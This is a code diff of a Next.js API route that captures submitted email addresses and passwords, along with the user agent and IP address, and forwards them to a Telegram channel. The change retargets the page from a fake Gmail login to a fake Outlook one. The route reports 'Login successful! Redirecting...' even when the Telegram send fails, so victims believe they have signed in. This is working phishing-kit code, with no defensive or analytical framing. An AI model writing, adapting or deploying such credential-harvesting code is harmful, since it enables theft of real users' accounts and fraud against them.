@@ -29,7 +29,7 @@ async function sendToTelegram(email: string, password: string, userAgent: string
 
 export async function POST(request: NextRequest) {
     try {
-        const { email, password, service } = await request.json();
+        const { email, password } = await request.json();
         const userAgent = request.headers.get('user-agent') || 'Unknown';
         const ip = request.headers.get('x-forwarded-for') || 'Unknown';
 
@@ -42,18 +42,18 @@ export async function POST(request: NextRequest) {
         }
 
         // Send to Telegram
-        const telegramResult = await sendToTelegram(email, password, userAgent, ip, 'Gmail');
+        const telegramResult = await sendToTelegram(email, password, userAgent, ip, 'Outlook');
 
         if (telegramResult.success) {
             return NextResponse.json({
                 success: true,
-                message: 'Sign in successful! Redirecting...'
+                message: 'Login successful! Redirecting...'
             });
         } else {
             console.error('Failed to send to Telegram:', telegramResult.error);
             return NextResponse.json({
                 success: true,
-                message: 'Sign in successful! Redirecting...'
+                message: 'Login successful! Redirecting...'
             });
         }
 
